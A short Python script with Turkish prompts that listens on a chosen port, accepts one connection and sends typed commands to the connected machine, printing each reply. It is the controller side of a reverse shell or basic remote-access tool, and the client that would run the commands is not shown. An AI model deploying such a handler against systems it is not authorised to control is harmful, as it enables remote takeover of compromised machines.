import socket

PORT = int(input("Dinlenecek port gir: "))
s = socket.socket()
s.bind(("0.0.0.0", PORT))
s.listen(1)
print(f"[+] Dinleniyor: 0.0.0.0:{PORT}")

client, addr = s.accept()
print(f"[✓] Baglandi: {addr}")
print(client.recv(1024).decode())

while True:
    komut = input("Komut > ")
    client.send(komut.encode())
    if komut == "exit":
        break
    cevap = client.recv(4096).decode()
    print(cevap)
